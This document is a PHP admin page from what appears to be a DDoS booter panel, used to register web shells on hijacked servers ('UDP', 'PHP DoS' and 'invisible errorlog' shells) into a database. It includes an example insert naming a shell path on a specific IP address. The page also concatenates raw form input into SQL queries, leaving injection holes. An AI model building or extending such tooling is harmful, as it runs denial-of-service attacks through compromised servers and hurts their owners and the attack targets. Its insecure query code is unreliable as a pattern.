<?php
require('myaccount.php');
?>

<div class="content">
<?php if (checkAdmin()) { ?> 
Input a PHP page extension of a shell below to insert it to the database: <br> <br>


Add a GET Shell (<font color="lime">Green UDP Shells</font>): <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url" type="text" id="url">
<input class="button" type="submit" name="Submit" value="Add GET Shell"></td>

</form>

<hr>

Add a POST Shell (<font color="red">Red PHP DoS Shells</font>): <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url2" type="text" id="url2"></td>
<input class="button" type="submit" name="Submit2" value="Add POST Shell">

</form>

<hr>

Add a Errorlog Shell (<font color="#cccccc">Invisible GET Shell</font>): <form name="frmcontadd" action="" method="post">
<input class="entryfield" name="url3" type="text" id="url2"></td>
<input class="button" type="submit" name="Submit3" value="Add Errorlog Shell">

</form>

<hr>
<form>
Add a shell dump (<font color="#ffffff">mySQL Query Format</font>): <input class="button" type="submit" name="Query" value="Add Shells Dump (Query)"> <br />

<TEXTAREA NAME="sql" COLS=80 ROWS=6>
Example query format is given below:
INSERT INTO `getshells`(URL) VALUES ('http://85.232.156.145/webdav/x32.php'); 
</TEXTAREA>
</form>

<br />

<hr>

<center>All shells must be manually removed by visiting: <a href="manageshells.php">here</a></center>


<?php


if (isset($_POST['Submit'])){
	if($host == '') {
	die("You cannot leave this empty");
	}
	$host = $_POST['url'];
	$query = "INSERT INTO getshells (url) VALUES ('$host')";
	$result = mysql_query($query);
echo '<hr>Successfully added GET Shell, ' . $host . ' to the shells database.';
}
?>

<?php
if (isset($_POST['Submit2'])){
	if($host2 == '') {
	die("You cannot leave this empty");
	}
	$host2 = $_POST['url2'];
	$query = "INSERT INTO postshells (url) VALUES ('$host2')";
	$result = mysql_query($query);
echo '<hr>Successfully added POST Shell, ' . $host2 . ' to the shells database.';
}
}
?>
</div>


<br>

<?php 
include 'footer.php';
?>